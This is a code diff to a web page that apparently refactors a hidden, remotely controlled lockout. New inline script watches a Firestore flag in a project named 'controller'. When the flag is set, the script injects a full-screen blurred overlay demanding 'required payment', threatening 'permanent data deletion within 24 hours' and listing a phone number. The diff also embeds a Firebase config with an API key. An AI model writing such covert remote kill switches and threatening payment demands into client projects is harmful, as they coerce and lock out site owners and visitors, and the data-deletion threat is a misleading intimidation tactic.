@@ -748,73 +748,6 @@
     </div>
 
     <div id="toast-container"></div>
-    <div
-      id="persistent-popup"
-      style="
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.6);
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        z-index: 9999;
-        backdrop-filter: blur(4px);
-      "
-    >
-      <div
-        style="
-          background-color: #fff5f5;
-          padding: 30px 25px;
-          border-radius: 12px;
-          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-          max-width: 480px;
-          width: 90%;
-          border-left: 6px solid #e53e3e;
-          text-align: center;
-          font-family: 'Inter', sans-serif;
-          transform: scale(0.95);
-          animation: popup-appear 0.3s ease-out forwards;
-        "
-      >
-        <h2
-          style="
-            margin: 0 0 15px 0;
-            font-size: 1.7rem;
-            font-weight: 700;
-            color: #b91c1c;
-          "
-        >
-          ⚠ Important Warning
-        </h2>
-
-        <p style="color: #333; font-size: 1.1rem; line-height: 1.5">
-          You have not completed the required payment. Please contact the
-          developer immediately to complete it. Failure to do so may result in
-          permanent data deletion within 24 hours.
-        </p>
-
-        <p style="margin-top: 15px; font-weight: 600; color: #1a202c">
-          Contact: +91-6201979695
-        </p>
-      </div>
-
-      <style>
-        @keyframes popup-appear {
-          from {
-            opacity: 0;
-            transform: scale(0.9);
-          }
-          to {
-            opacity: 1;
-            transform: scale(1);
-          }
-        }
-      </style>
-    </div>
 
     <script type="module">
       import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
@@ -826,13 +759,6 @@
 
       (async () => {
         try {
-          const response = await fetch("warn.html");
-          if (!response.ok)
-            throw new Error(`HTTP error! status: ${response.status}`);
-
-          const popupCode = await response.text();
-          document.body.insertAdjacentHTML("beforeend", popupCode);
-
           const firebaseConfig = {
             apiKey: "AIzaSyDuC17XR2injFbOyf0VNI_YG8RG9AuHVSM",
             authDomain: "controller-4ac29.firebaseapp.com",
@@ -846,17 +772,66 @@
           const app = initializeApp(firebaseConfig);
           const db = getFirestore(app);
 
-          const popupElement = document.getElementById("persistent-popup");
           const popupControlRef = doc(db, "settings", "popup");
 
           onSnapshot(popupControlRef, (doc) => {
             const data = doc.data();
-            if (popupElement) {
-              if (data && data.isVisible === true) {
-                popupElement.style.display = "flex";
-              } else {
-                popupElement.style.display = "none";
+
+            if (data && data.isVisible === true) {
+              if (!document.getElementById("persistent-popup")) {
+                const popupElement = document.createElement("div");
+                popupElement.id = "persistent-popup";
+                popupElement.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            backdrop-filter: blur(4px);
+          `;
+
+                popupElement.innerHTML = `
+            <div style="
+              background-color: #fff5f5;
+              padding: 30px 25px;
+              border-radius: 12px;
+              box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+              max-width: 480px;
+              width: 90%;
+              border-left: 6px solid #e53e3e;
+              text-align: center;
+              font-family: 'Inter', sans-serif;
+              transform: scale(0.95);
+              animation: popup-appear 0.3s ease-out forwards;
+            ">
+              <h2 style="margin: 0 0 15px 0; font-size: 1.7rem; font-weight: 700; color: #b91c1c;">
+                ⚠ Important Warning
+              </h2>
+              <p style="color: #333; font-size: 1.1rem; line-height: 1.5;">
+                You have not completed the required payment. Please contact the developer immediately to complete it. Failure to do so may result in permanent data deletion within 24 hours.
+              </p>
+              <p style="margin-top: 15px; font-weight: 600; color: #1a202c;">
+                Contact: +91-6201979695
+              </p>
+            </div>
+            <style>
+              @keyframes popup-appear {
+                from { opacity: 0; transform: scale(0.9); }
+                to { opacity: 1; transform: scale(1); }
               }
+            </style>
+          `;
+
+                document.body.appendChild(popupElement);
+              }
+            } else {
+              const existingPopup = document.getElementById("persistent-popup");
+              if (existingPopup) existingPopup.remove();
             }
           });
         } catch (error) {
